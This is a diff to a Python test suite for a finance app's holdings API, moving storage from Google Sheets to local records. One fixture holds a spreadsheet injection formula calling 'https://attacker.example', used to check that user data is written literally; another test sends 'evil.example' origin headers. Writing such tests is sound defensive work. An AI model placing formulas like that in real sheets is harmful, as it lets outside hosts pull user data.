@@ -15,14 +15,15 @@ from app.modules.portfolio import holdings_manager, portfolio_manager
 def holding_input(**changes):
     return HoldingInput(**{
         "position_id": "position-one", "ticker": "NASDAQ:AAPL", "label": "Apple",
-        "currency": "USD", "quantity": "1.123456789012", "avg_cost": "150.125",
+        "currency": "USD", "quantity": "12", "avg_cost": "150.125",
         **changes,
     })
 
 
-def test_holding_input_keeps_decimal_quantity_and_optional_unknown_cost():
+def test_holding_input_uses_integer_quantity_and_optional_unknown_cost():
     body = holding_input(avg_cost=None)
-    assert body.quantity == Decimal("1.123456789012")
+    assert body.quantity == 12
+    assert isinstance(body.quantity, int)
     assert body.avg_cost is None
 
 
@@ -50,12 +51,14 @@ def test_manual_price_supports_unqualified_unsupported_ticker_without_zero_defau
     assert body.price_as_of == date(2026, 1, 1)
 
 
-def test_legacy_holdings_crud_cannot_bypass_sheet_authority(client):
-    assert client.put("/api/finance/settings", json={"spreadsheet_id": "private-test-sheet"}).status_code == 200
+def test_legacy_sheets_endpoints_retired_and_local_crud_available(client):
+    assert client.put("/api/finance/settings", json={"spreadsheet_id": "private-test-sheet"}).status_code == 410
+    assert client.post("/api/finance/sync").status_code == 410
     body = {"symbol": "AAPL", "name": "Apple", "currency": "USD", "quantity": "1"}
-    assert client.post("/api/data/holdings", json=body).status_code == 409
-    assert client.put("/api/data/holdings/123", json=body).status_code == 409
-    assert client.delete("/api/data/holdings/123").status_code == 409
+    created = client.post("/api/data/holdings", json=body)
+    assert created.status_code == 201
+    assert client.put(f"/api/data/holdings/{created.json()['id']}", json=body).status_code == 200
+    assert client.delete(f"/api/data/holdings/{created.json()['id']}").status_code == 204
 
 
 def writer():
@@ -76,7 +79,7 @@ def test_sdk_writer_uses_literal_cells_for_user_data_and_only_server_generated_f
     assert cells["start"]["rowIndex"] == 1
     values = [cell["userEnteredValue"] for cell in cells["rows"][0]["values"]]
     assert values[1] == {"stringValue": '=IMPORTXML("https://attacker.example","//x")'}
-    assert values[4] == {"stringValue": "1.123456789012"}
+    assert values[4] == {"stringValue": "12"}
     assert values[5] == {"stringValue": "150.125"}
     assert values[7] == {"formulaValue": '=GOOGLEFINANCE("NASDAQ:AAPL","price")'}
     assert "tradetime" in values[8]["formulaValue"]
@@ -212,117 +215,52 @@ def test_write_client_rejects_absent_user_credentials_without_adc_fallback(monke
 
 @pytest.fixture
 def holdings_api(client, monkeypatch):
+    from app.modules.portfolio import market_data_manager
     fake = MagicMock()
-    fake.source_identity = "adc"
-    fake.layout.return_value = {tab: i for i, tab in enumerate((*TABS, "Verification"))}
-    fake.holding_rows.return_value = []
-    tables = {tab: [] for tab in TABS}
-    tables["Holdings"] = [{"id": "position-one", "label": "Apple", "ticker": "NASDAQ:AAPL",
-                           "currency": "KRW", "quantity": "1.123456789012", "avg_cost": "150.125",
-                           "price": "185.125", "source": "googlefinance", "as_of": date.today().isoformat(),
-                           "price_as_of": date.today().isoformat(), "asset_class": "equity"}]
-    tables["Coverage"] = [{"month": "current", "cash": "true", "holding": "true",
-                           "liability": "true", "other": "true"}]
-    fake.tables.return_value = tables
-    fake.verify.return_value = {"quote": "185.125", "fx": "1400", "formulas": ["quote", "fx"]}
-    factory = MagicMock(return_value=fake)
-    monkeypatch.setattr(holdings_manager, "SheetsClient", factory)
-    monkeypatch.setattr(portfolio_manager, "SheetsClient", factory)
-    assert client.put("/api/finance/settings", json={"spreadsheet_id": "private-test-sheet"}).status_code == 200
+    # Local writes must not depend on or call a Google client.
+    factory = MagicMock(side_effect=AssertionError("Unexpected Google call"))
+    monkeypatch.setattr(market_data_manager, "QuotesSheet", factory)
     return client, fake, factory
 
 
-def test_save_verifies_real_cached_values_before_valuing_auto_quotes(holdings_api):
-    client, fake, factory = holdings_api
-    fake.verify.side_effect = ValueError("not calculated")
+def test_local_save_does_not_send_private_fields_to_google(holdings_api):
+    client, _, factory = holdings_api
     response = client.post("/api/finance/holdings", json=holding_input(currency="KRW").model_dump(mode="json"))
     assert response.status_code == 200, response.text
     assert response.json()["saved"] is True
     assert response.json()["quote_status"] == "pending"
     assert response.json()["portfolio"]["lines"][0]["value_krw"] is None
-    assert factory.call_args.kwargs["require_write"] is True
-    fake.verify.side_effect = None
-    assert client.post("/api/finance/verify").status_code == 200
-    valued = client.get("/api/finance/portfolio").json()
-    assert valued["lines"][0]["value_krw"] is not None
+    factory.assert_not_called()
 
 
-@pytest.mark.parametrize("price", [None, "", "#N/A", "#REF!"])
-def test_save_keeps_unavailable_quote_pending_instead_of_zero(holdings_api, price):
-    client, fake, _ = holdings_api
-    fake.tables.return_value["Holdings"][0]["price"] = price
-    response = client.post("/api/finance/holdings", json=holding_input(currency="KRW").model_dump(mode="json"))
-    assert response.status_code == 200, response.text
-    assert response.json()["saved"] is True
-    assert response.json()["quote_status"] == "pending"
-    assert response.json()["portfolio"]["lines"][0]["value_krw"] is None
-
-
-def test_successful_sheet_save_remains_success_if_following_sync_fails(holdings_api):
-    client, fake, _ = holdings_api
-    fake.tables.side_effect = RuntimeError("private error detail")
-    response = client.post("/api/finance/holdings", json=holding_input().model_dump(mode="json"))
-    assert response.status_code == 200, response.text
-    body = response.json()
-    assert body["saved"] is True
-    assert body["warning"]
-    assert body["settings"]["last_error"]
-    assert body["settings"]["last_sync_at"]
-    assert "private error detail" not in response.text
-    fake.upsert_holding.assert_called_once()
-
-
-def test_request_id_replay_cannot_overwrite_a_later_edit(holdings_api):
-    client, fake, _ = holdings_api
+def test_request_id_replay_cannot_overwrite_later_local_edit(holdings_api):
+    client, _, factory = holdings_api
     original = holding_input(request_id="request-one").model_dump(mode="json")
-    later = holding_input(request_id="request-two", quantity="7").model_dump(mode="json")
-    assert client.post("/api/finance/holdings", json=original).status_code == 200
-    assert client.post("/api/finance/holdings", json=later).status_code == 200
-    response = client.post("/api/finance/holdings", json=original)
-    assert response.status_code == 200, response.text
-    assert response.json()["saved"] is True
-    assert response.json()["replayed"] is True
-    assert fake.upsert_holding.call_count == 2
-    collision = {**original, "quantity": "9"}
-    assert client.post("/api/finance/holdings", json=collision).status_code == 422
-    assert fake.upsert_holding.call_count == 2
-
-
-def test_source_change_aborts_write_before_sending_any_user_data(holdings_api):
-    client, fake, _ = holdings_api
-    fake.source_identity = "oauth:unrelated-user"
-    response = client.post("/api/finance/holdings", json=holding_input().model_dump(mode="json"))
-    assert response.status_code == 422
-    fake.upsert_holding.assert_not_called()
-    fake.ensure_current_fx.assert_not_called()
-
-
-def test_refresh_cooldown_makes_no_sheets_requests_or_historical_changes(holdings_api, session):
-    from app.modules.database.model.portfolio import MonthlySnapshot
-    from sqlalchemy import select
-
-    client, fake, _ = holdings_api
-    old = MonthlySnapshot(month=date(2026, 1, 31), revision=1, reason="recorded history",
-                          payload={"immutable_evidence": {"quantity": "2", "price": "100"}})
-    session.add(old)
-    session.commit()
-    before = deepcopy(old.payload)
-    first = client.post("/api/finance/holdings/refresh")
+    first = client.post("/api/finance/holdings", json=original)
     assert first.status_code == 200, first.text
-    fake.reset_mock()
-    second = client.post("/api/finance/holdings/refresh")
-    assert second.status_code == 200, second.text
-    assert second.json()["refresh_after_seconds"] > 0
-    fake.layout.assert_not_called()
-    fake.holding_rows.assert_not_called()
-    fake.tables.assert_not_called()
-    fake.verify.assert_not_called()
-    fake.upsert_holding.assert_not_called()
-    fake.ensure_current_fx.assert_not_called()
-    session.expire_all()
-    snapshots = session.scalars(select(MonthlySnapshot)).all()
-    assert len(snapshots) == 1
-    assert snapshots[0].payload == before
+    row = first.json()["rows"][0]
+    later = holding_input(request_id="request-two", quantity="7", expected_version=row["expected_version"]).model_dump(mode="json")
+    assert client.post("/api/finance/holdings", json=later).status_code == 200
+    replay = client.post("/api/finance/holdings", json=original)
+    assert replay.status_code == 200, replay.text
+    assert replay.json()["replayed"] is True
+    assert Decimal(replay.json()["rows"][0]["quantity"]) == Decimal("7")
+    assert client.post("/api/finance/holdings", json={**original,"quantity":"9"}).status_code == 422
+    factory.assert_not_called()
+
+
+def test_quote_refresh_without_connection_preserves_historical_snapshot(holdings_api, session):
+    from app.modules.database.model import MonthlySnapshot
+    client, _, factory = holdings_api
+    evidence = {"immutable_evidence": {"quantity": "2", "price": "100"}}
+    old = MonthlySnapshot(month=date(2026,1,1),revision=1,reason="recorded history",payload=evidence)
+    session.add(old);session.commit()
+    result = client.post("/api/finance/holdings/refresh")
+    assert result.status_code == 200, result.text
+    assert result.json()["warning"]
+    session.refresh(old)
+    assert old.payload == evidence
+    factory.assert_not_called()
 
 
 @pytest.mark.parametrize("path,body", [
@@ -330,12 +268,9 @@ def test_refresh_cooldown_makes_no_sheets_requests_or_historical_changes(holding
 ])
 @pytest.mark.parametrize("headers", [{"Origin": "https://evil.example"}, {"Sec-Fetch-Site": "cross-site"}])
 def test_cross_origin_cannot_trigger_google_sheet_mutations(holdings_api, path, body, headers):
-    client, fake, factory = holdings_api
-    # Use valid payload so authorization is tested rather than schema rejection.
+    client, _, factory = holdings_api
     payload = holding_input().model_dump(mode="json") if body is not None else None
     endpoint = "/api/finance/holdings" + (f"/{path}" if path else "")
     response = client.post(endpoint, json=payload, headers=headers)
     assert response.status_code == 403, response.text
     factory.assert_not_called()
-    fake.initialize.assert_not_called()
-    fake.upsert_holding.assert_not_called()
